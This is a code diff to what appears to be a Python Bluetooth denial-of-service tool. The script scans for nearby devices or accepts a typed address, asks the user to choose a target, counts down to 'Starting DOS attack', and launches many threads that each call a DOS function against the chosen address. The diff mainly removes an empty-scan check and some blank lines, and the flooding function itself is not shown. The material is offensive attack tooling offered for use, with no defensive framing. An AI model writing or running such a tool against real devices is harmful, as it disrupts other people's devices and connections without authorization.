@@ -30,19 +30,12 @@ def main():
     action = input("SCANNING nearby devices or type specific ADDRESS ? (S/A) > ")
     if action in ['s', 'S']:
         targets = SCAN()
-        
-        if len(targets) <= 0:
-            print('[!] ERROR: No devices.')
-            exit(0)
-
         target_num = int(input('Target(Type the number of above targets) > '))
-
         if target_num < 0 or target_num >= len(targets):
             print('[!] ERROR: Out of range 0 ~ ', len(targets)-1)
             exit(0)
         else:
             target_addr = targets[target_num]
-            
     elif action in ['a', 'A']:
     	target_addr = input('Target Address > ')
 
@@ -60,13 +53,11 @@ def main():
     os.system('clear')
 
     print("[*] Starting DOS attack in 3 seconds...")
-
     for i in range(0, 3):
         print('[*] ' + str(3 - i))
         time.sleep(1)
     os.system('clear')
     print('[*] Building threads...\n')
-
     for i in range(0, threads_count):
         print('[*] Built thread №' + str(i + 1))
         threading.Thread(target=DOS, args=[str(target_addr), str(packages_size)]).start()
